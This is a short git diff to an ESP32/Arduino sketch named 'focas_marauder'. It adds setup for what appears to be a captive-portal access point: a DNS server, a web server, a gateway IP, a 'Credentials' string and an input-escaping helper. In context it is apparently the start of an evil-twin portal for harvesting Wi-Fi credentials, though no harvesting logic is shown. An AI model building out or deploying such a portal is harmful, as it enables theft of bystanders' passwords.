30ba635d52ae9e713fdc8e7b98bc76d26562b82c
AoiteFoca <nathancielusinski@gmail.com>
2024-06-04 23:27:05 -0300

    Update focas_marauder.ino

--- focas_marauder/focas_marauder.ino
+++ focas_marauder/focas_marauder.ino
@@ -18,6 +18,25 @@ int previous=-1;
 int BUILTIN_LED = 10;
 
 //Settings do init do sistema
+const byte HTTP_CODE = 200;
+const byte DNS_PORT = 53;
+const byte TICK_TIMER = 1000;
+IPAddress APIP(172, 0, 0, 1); // Gateway
+
+String Credentials = "";
+unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
+DNSServer dnsServer; WebServer webServer(80);
+
+String input(String argName) {
+  String a = webServer.arg(argName);
+  a.replace("<", "&lt;"); a.replace(">", "&gt;");
+  a.substring(0, 200); return a;
+}
+
+String footer() {
+  return
+    "</div><div class=q><a>Patria Amada Bostil &#169;. Desordem e Regresso.</a></div>";
+}
 
 void setup() {
   // put your setup code here, to run once:
